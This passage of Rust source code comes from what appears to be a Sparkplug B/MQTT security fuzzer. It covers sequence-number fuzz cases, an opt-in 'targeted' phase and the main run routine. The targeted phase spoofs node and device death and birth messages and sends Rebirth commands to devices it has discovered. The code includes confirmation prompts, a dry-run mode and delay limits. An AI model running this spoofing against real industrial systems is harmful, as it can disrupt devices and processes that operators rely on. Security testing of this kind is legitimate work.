    // Establish NBIRTH so subsequent NDATA messages have valid context
    {
        let birth_topic = sp_topic(FUZZ_GROUP, "NBIRTH", FUZZ_NODE, None);
        if !safe_publish(session, &birth_topic, &nbirth_payload(0), delay_ms,
            "sequence  NBIRTH preamble", dry_run) {
            println!("  [!] sequence: NBIRTH preamble failed; NDATA tests lack valid context");
        }
    }

    let metric = build_metric_bool("fuzz/seq/probe", true);

    // seq cases: (seq value, description)
    let cases: &[(u64, &str)] = &[
        (0,              "seq=0 (valid first)"),
        (1,              "seq=1 (valid next)"),
        (127,            "seq=127"),
        (255,            "seq=255 (near rollover)"),
        (256,            "seq=256 (rollover point)"),
        (0,              "seq=0 (after rollover)"),
        (5,              "seq=5 (gap: skipped 1-4)"),
        (3,              "seq=3 (backwards from 5)"),
        (5,              "seq=5 (duplicate of earlier 5)"),
        (0xFFFF,         "seq=65535"),
        (0xFFFF_FFFF,    "seq=2^32-1"),
        (u64::MAX,       "seq=u64::MAX"),
        (u64::MAX - 1,   "seq=u64::MAX-1"),
    ];

    for (seq, desc) in cases {
        let payload = build_payload(*seq, std::slice::from_ref(&metric));
        if safe_publish(session, &topic, &payload, delay_ms, &format!("sequence  {desc}"), dry_run) {
            count += 1;
        }
    }

    println!("  [*] sequence: {count} messages sent");
    count
}

// ─── Targeted phase ───────────────────────────────────────────────────────────

fn run_targeted(
    session: &mut MqttSession,
    devices: &[SparkplugDevice],
    delay_ms: u64,
    dry_run: bool,
) -> usize {
    let mut count = 0;
    for dev in devices {
        // Skip our own fuzzer node
        if dev.group == FUZZ_GROUP && dev.node == FUZZ_NODE {
            continue;
        }

        // Spoof NDEATH
        let death_topic = sp_topic(&dev.group, "NDEATH", &dev.node, None);
        let death_payload = ndeath_payload(0);
        if safe_publish(session, &death_topic, &death_payload, delay_ms,
            &format!("targeted  NDEATH spoof for {}/{}", dev.group, dev.node), dry_run) {
            count += 1;
        }
        // Extra pause before spoofed birth — disruptive action
        if !dry_run {
            thread::sleep(Duration::from_millis(500));
        }

        // Spoof NBIRTH
        let birth_topic = sp_topic(&dev.group, "NBIRTH", &dev.node, None);
        let birth_payload = nbirth_payload(0);
        if safe_publish(session, &birth_topic, &birth_payload, delay_ms,
            &format!("targeted  NBIRTH spoof for {}/{}", dev.group, dev.node), dry_run) {
            count += 1;
        }

        // Send Rebirth NCMD
        let ncmd_topic = sp_topic(&dev.group, "NCMD", &dev.node, None);
        let rebirth_metric = build_metric_bool("Node Control/Rebirth", true);
        let ncmd_payload = build_payload(0, &[rebirth_metric]);
        if safe_publish(session, &ncmd_topic, &ncmd_payload, delay_ms,
            &format!("targeted  NCMD Rebirth for {}/{}", dev.group, dev.node), dry_run) {
            count += 1;
        }

        // If a device was discovered, spoof DDEATH + DBIRTH
        if let Some(ref device_id) = dev.device {
            let ddeath_topic = sp_topic(&dev.group, "DDEATH", &dev.node, Some(device_id));
            let ddeath_payload = ndeath_payload(0);
            if safe_publish(session, &ddeath_topic, &ddeath_payload, delay_ms,
                &format!("targeted  DDEATH spoof for {}/{}/{}", dev.group, dev.node, device_id), dry_run) {
                count += 1;
            }
            if !dry_run {
                thread::sleep(Duration::from_millis(500));
            }

            let dbirth_topic = sp_topic(&dev.group, "DBIRTH", &dev.node, Some(device_id));
            let dbirth_metric = build_metric_bool("Node Control/Rebirth", false);
            let dbirth_payload = build_payload(0, &[dbirth_metric]);
            if safe_publish(session, &dbirth_topic, &dbirth_payload, delay_ms,
                &format!("targeted  DBIRTH spoof for {}/{}/{}", dev.group, dev.node, device_id), dry_run) {
                count += 1;
            }
        }
    }
    count
}

// ─── Main entry point ─────────────────────────────────────────────────────────

/// Run the Sparkplug B fuzzer against the already-connected `session`.
///
/// `host` and `port` are used only for display. `no_creds` should be true
/// when the session was opened without username/password (for auth assessment).
pub fn run_sparkplug_fuzz(
    session: &mut MqttSession,
    host: &str,
    port: u16,
    no_creds: bool,
    config: &FuzzConfig,
) -> Result<()> {
    // Safety: enforce minimums
    let delay_ms = config.delay_ms.max(50);
    let discovery_secs = config.discovery_secs.max(5);

    if config.delay_ms < 50 {
        println!("  [!] delay clamped from {}ms \u{2192} 50ms (safety minimum)", config.delay_ms);
    }
    if config.discovery_secs < 5 {
        println!("  [!] discovery-time clamped from {}s \u{2192} 5s (safety minimum)", config.discovery_secs);
    }

    // Step 1: Responsible-use banner — not skippable
    if !print_banner_and_confirm(host, port) {
        println!("  Aborted.");
        return Ok(());
    }

    // Step 2: Subscribe for discovery
    let _ = session.subscribe("spBv1.0/#", 0);
    let _ = session.subscribe("STATE/#", 0);

    // Step 3: Passive discovery
    let (discovered, any_rx) = passive_discovery(session, discovery_secs);

    // Step 4: Auth assessment (passive — no active write probe)
    println!();
    println!("  [*] Auth assessment:");
    println!("      anon_connect_accepted : {}", if no_creds { "yes" } else { "no (credentials provided)" });
    println!("      anon_subscribe_seen   : {}", if any_rx { "yes" } else { "no (no traffic observed)" });
    println!("      anon_publish_probe    : skipped (passive mode; use --probe-write to test write access)");
    println!();

    let dry_run = config.dry_run;
    if dry_run {
        println!("  [*] DRY RUN: no messages will be published.");
        println!();
    }

    // Step 5: Establish fuzzer presence (NBIRTH + DBIRTH) before any DDATA categories.
    // This ensures wildcard subscribers see a valid node birth before receiving data.
    fuzz_establish(session, delay_ms, dry_run);
    println!();

    // Step 6: Categories
    let mut totals: Vec<(FuzzCategory, usize)> = Vec::new();
    for &cat in &config.categories {
        println!("  [*] Risk: {} -- {}", cat.name(), cat.risk_label());
        let n = match cat {
            FuzzCategory::Topic    => fuzz_topic(session, delay_ms, dry_run),
            FuzzCategory::Malformed => fuzz_malformed(session, delay_ms, dry_run),
            FuzzCategory::Boundary => fuzz_boundary(session, delay_ms, dry_run),
            FuzzCategory::Ordering => fuzz_ordering(session, delay_ms, dry_run),
            FuzzCategory::Sequence => fuzz_sequence(session, delay_ms, dry_run),
        };
        totals.push((cat, n));
        println!();
    }

    // Step 7: Targeted phase (opt-in)
    let targeted_count = if config.probe_write && !discovered.is_empty() {
        if confirm_targeted(discovered.len()) {
            let n = run_targeted(session, &discovered, delay_ms, dry_run);
            println!("  [*] Targeted phase: {n} messages sent");
            n
        } else {
            println!("  Targeted phase aborted.");
            0
        }
    } else {
        if config.probe_write {
            println!("  [*] Targeted phase skipped: no devices discovered during passive listen.");
        }
        0
    };

    // Step 8: Cleanup — publish NDEATH to remove FuzzNode from broker state.
    // Uses safe_publish so the enforced inter-message delay is respected.
    {
        let ndeath_topic = sp_topic(FUZZ_GROUP, "NDEATH", FUZZ_NODE, None);
        let ndeath = ndeath_payload(0);
        if !safe_publish(session, &ndeath_topic, &ndeath, delay_ms,
            &format!("cleanup  NDEATH {FUZZ_GROUP}/{FUZZ_NODE}"), dry_run) {
            println!("  [!] cleanup: NDEATH failed — FuzzNode may remain alive in broker state");
        }
    }

    // Step 9: Summary
    let total_tx: usize = totals.iter().map(|(_, n)| n).sum::<usize>() + targeted_count;
    let node_count = discovered.iter().filter(|d| d.device.is_none()).count();
    let device_count = discovered.iter().filter(|d| d.device.is_some()).count();
    println!();
    println!("  \u{2550}\u{2550} Sparkplug B Fuzz Summary \u{2550}\u{2550}");
    println!("  Target:          {host}:{port}");
    println!("  Discovered:      {node_count} node(s), {device_count} device(s)");
    println!("  Auth:            {}", if no_creds && any_rx { "anonymous access accepted" } else if no_creds { "anonymous (no traffic observed)" } else { "credentials provided" });
    println!("  Delay enforced:  {delay_ms}ms between messages");
    let cats_str: Vec<String> = totals.iter()
        .map(|(c, n)| format!("{}({})", c.name(), n))
        .collect();
    println!("  Categories run:  {}", cats_str.join("  "));
    if config.probe_write {
        println!("  Targeted phase:  {targeted_count} messages sent");
    } else {
        println!("  Targeted phase:  skipped (use --probe-write to enable)");
    }
    println!("  Total TX:        {total_tx}");
    println!();

    Ok(())
}
